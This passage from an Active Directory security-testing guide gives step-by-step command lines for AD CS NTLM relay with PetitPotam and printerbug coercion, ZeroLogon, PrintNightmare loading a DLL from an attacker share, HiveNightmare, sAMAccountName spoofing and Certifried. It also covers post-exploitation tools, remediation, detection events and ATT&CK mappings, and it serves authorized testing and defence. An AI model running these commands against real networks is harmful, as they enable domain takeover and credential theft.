- **Network Device Enrollment Service (NDES)** - Simple Certificate Enrollment Protocol (SCEP)

**Attack Flow:**
1. Configure NTLM relay to target AD CS HTTP endpoint
2. Coerce target authentication (printerbug, petitpotam, DFSCoerce, etc.)
3. Relay authentication to request certificate as target
4. Receive certificate for compromised account/computer

**Impact:** Compromise any account that can be coerced to authenticate (especially machine accounts)

**Tools:**
- **ntlmrelayx** - Impacket NTLM relay tool with ADCS support
- **Coercion tools** - PetitPotam, PrinterBug, DFSCoerce, Coercer

**Exploitation:**
```bash
# Start ntlmrelayx targeting AD CS web enrollment
python ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs --template 'Machine'

# Alternative: Target CES endpoint
python ntlmrelayx.py -t https://<ca_server>/CertSrv/CertificateEnrollmentWebService.svc -smb2support --adcs

# Coerce domain controller authentication (PetitPotam)
python PetitPotam.py <attacker_ip> <dc_hostname>

# Coerce via printer bug (alternative)
python printerbug.py <dc_hostname> <attacker_ip>

# Certipy - Relay to Certificate Enrollment Service
certipy relay -ca <ca_server>

# Result: Receive DC machine certificate → Authenticate as DC → DCSync
```

**Why Machine Accounts Are High Value:**
- Domain Controllers authenticate as SYSTEM → DC machine certificate
- DC certificate enables S4U2Self → Impersonate any user
- Immediate domain compromise

**Remediation:**
- **Disable HTTP enrollment endpoints** (use RPC enrollment only)
- Enable Extended Protection for Authentication (EPA) on web enrollment
- Require HTTPS with channel binding
- Disable NTLM authentication (enforce Kerberos only)
- Enable SMB signing and LDAP signing domain-wide
- Disable Print Spooler service on Domain Controllers

---

### 7.8 ESC9-ESC15

**ESC9:** No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)
**ESC10:** Weak Certificate Mappings
**ESC11:** IF_ENFORCEENCRYPTICERTREQUEST not set
**ESC13:** OID Group Link abuse
**ESC14:** Weak certificate bindings
**ESC15:** NTLM relay via CertSvc RPC

*(Full exploitation details available in ADCS-specific documentation)*

---

## 8. CVE Exploitation (Critical AD Vulnerabilities)

### 8.1 ZeroLogon (CVE-2020-1472)

**Description:** Netlogon elevation of privilege

**Exploitation:**
```bash
python zerologon.py <dc_hostname> <dc_ip>
python secretsdump.py -no-pass -just-dc <domain>/<dc_hostname>$@<dc_ip>
```

---

### 8.2 PrintNightmare (CVE-2021-34527)

**Description:** Remote code execution via Print Spooler

**Exploitation:**
```bash
python CVE-2021-34527.py <domain>/<user>:<password>@<target_ip> '\\<attacker_ip>\share\evil.dll'
```

---

### 8.3 SeriousSAM / HiveNightmare (CVE-2021-36934)

**Description:** Local privilege escalation via SAM/SYSTEM file access

**Exploitation:**
```powershell
# Copy SAM and SYSTEM from shadow copies
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Extract hashes
python secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

### 8.4 sAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)

**Description:** Domain privilege escalation via sAMAccountName manipulation

**Exploitation:**
```bash
python sam_the_admin.py <domain>/<user>:<password> -dc-ip <dc_ip> -shell
```

---

### 8.5 Certifried (CVE-2022-26923)

**Description:** AD CS privilege escalation via computer account manipulation

**Exploitation:**
```bash
# Add computer account with dNSHostName = DC
python addcomputer.py -computer-name 'FAKEDC$' -computer-pass 'FakePass123' -dc-ip <dc_ip> <domain>/<user>:<password>

# Request certificate
certipy req -u 'FAKEDC$'@<domain> -p 'FakePass123' -ca '<ca_name>' -template 'Machine'

# Authenticate as DC
certipy auth -pfx dc.pfx
```

---

## 9. Post-Exploitation

### 9.1 Credential Harvesting

- Browser credential extraction (Chrome, Firefox, Edge)
- Saved RDP credentials
- Wi-Fi passwords
- Scheduled task credentials
- Application credentials (FileZilla, PuTTY, etc.)

**Tools:** LaZagne, SharpDPAPI, Mimikatz

---

### 9.2 Data Exfiltration

- Sensitive file discovery (passwords.txt, credentials.xlsx, etc.)
- Database credential extraction
- Source code repositories
- Intellectual property

**Tools:** Snaffler, PowerSploit

---

### 9.3 Situational Awareness

- Installed software enumeration
- Running processes and services
- Network connections
- Scheduled tasks
- User activity monitoring

**Tools:** Seatbelt, SharpUp, PowerUp

---

## 10. Remediation Recommendations

### High-Priority Fixes

1. **Disable NTLM** (where possible, use Kerberos only)
2. **Enable SMB signing** on all systems
3. **Disable LLMNR/NBT-NS** poisoning vectors
4. **Patch critical CVEs** (ZeroLogon, PrintNightmare, etc.)
5. **Rotate krbtgt password** regularly (at least annually)
6. **Remove unconstrained delegation** from non-DC computers
7. **Fix ADCS misconfigurations** (ESC1-ESC15 vulnerabilities)
8. **Enable Advanced Audit Policies** (4769, 4768, 4776, 4688)
9. **Implement LAPS** for local admin password management
10. **Enforce strong password policies** (length, complexity, age)

### Medium-Priority Fixes

1. Restrict administrative group membership
2. Limit service account privileges
3. Review and harden GPO permissions
4. Implement tiered administration model
5. Enable Protected Users group for high-value accounts
6. Disable legacy protocols (SMBv1, NTLM v1)
7. Review and remediate dangerous ACLs
8. Implement credential guard on endpoints
9. Enable Windows Defender Credential Guard on DCs
10. Separate admin accounts from user accounts

### Detection & Monitoring

**Key Events to Monitor:**
- 4768: Kerberos TGT requested
- 4769: Kerberos TGS requested
- 4776: NTLM authentication
- 4672: Admin logon
- 4688: Process creation (with command line logging)
- 4720: User account created
- 4732: User added to security group
- 5136: Directory service object modified

**Tools:** Microsoft Defender for Identity, BloodHound, Splunk, Elastic Security

---

## 11. ATT&CK for Enterprise Mapping

**Primary Tactics:**
- TA0001: Initial Access
- TA0003: Persistence
- TA0004: Privilege Escalation
- TA0005: Defense Evasion
- TA0006: Credential Access
- TA0007: Discovery
- TA0008: Lateral Movement

**Key Techniques:**
- T1558: Steal or Forge Kerberos Tickets
  - T1558.001: Golden Ticket
  - T1558.002: Silver Ticket
  - T1558.003: Kerberoasting
  - T1558.004: AS-REP Roasting
- T1003: OS Credential Dumping
  - T1003.001: LSASS Memory
  - T1003.002: Security Account Manager
  - T1003.003: NTDS
  - T1003.004: LSA Secrets
  - T1003.005: Cached Domain Credentials
  - T1003.006: DCSync
  - T1003.008: /etc/passwd and /etc/shadow
- T1087: Account Discovery
- T1069: Permission Groups Discovery
- T1482: Domain Trust Discovery
- T1021: Remote Services
  - T1021.002: SMB/Windows Admin Shares
  - T1021.003: Distributed Component Object Model
  - T1021.004: SSH
  - T1021.006: Windows Remote Management
- T1550: Use Alternate Authentication Material
  - T1550.002: Pass the Hash
  - T1550.003: Pass the Ticket

---

## 12. Compliance Frameworks

**CIS Critical Security Controls:**
- Control 4: Controlled Use of Administrative Privileges
- Control 5: Secure Configuration for Hardware and Software
- Control 6: Maintenance, Monitoring and Analysis of Audit Logs
- Control 16: Account Monitoring and Control

**NIST SP 800-53:**
- AC-2: Account Management
- AC-3: Access Enforcement
- IA-2: Identification and Authentication
- IA-5: Authenticator Management
- AU-2: Audit Events
- SI-4: System Monitoring

**Microsoft Security Baselines:**
- Windows Server 2022 Security Baseline
- Active Directory Domain Services Security Baseline

---

## References

**Primary Research:**
- **Active Directory Mindmap:** v2025.03 (Daahtk) - Comprehensive AD attack technique visualization
- **SpecterOps "Certified Pre-Owned":** https://specterops.io/blog/2021/06/17/certified-pre-owned/ - ADCS exploitation research (ESC1-ESC8)
- **MITRE ATT&CK for Enterprise:** https://attack.mitre.org/matrices/enterprise/windows/ - Technique mapping

**Tools and Projects:**
- **GhostPack:** https://github.com/GhostPack - Offensive .NET tooling (Rubeus, Certify, Seatbelt, SharpDPAPI, SafetyKatz, SharpUp, Koh, PSPKIAudit, ForgeCert)
- **Impacket:** https://github.com/fortra/impacket - Python offensive toolkit
- **Certipy:** https://github.com/ly4k/Certipy - Python ADCS exploitation
- **BloodHound:** https://bloodhound.readthedocs.io - Attack path graphing

**Knowledge Resources:**
- **SpecterOps Blog:** https://posts.specterops.io - Advanced AD security research
- **harmj0y Blog:** https://blog.harmj0y.net - PowerView, Kerberos, and AD attacks
- **ADSecurity.org:** https://adsecurity.org - Sean Metcalf's AD security content
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings - Attack techniques reference

---

**Version:** 1.0 (Production Ready)
**Created:** 2025-12-04
**Framework:** Intelligence Adjacent (IA) - Security Testing
**Tools Required:** See `servers/ad-security/`
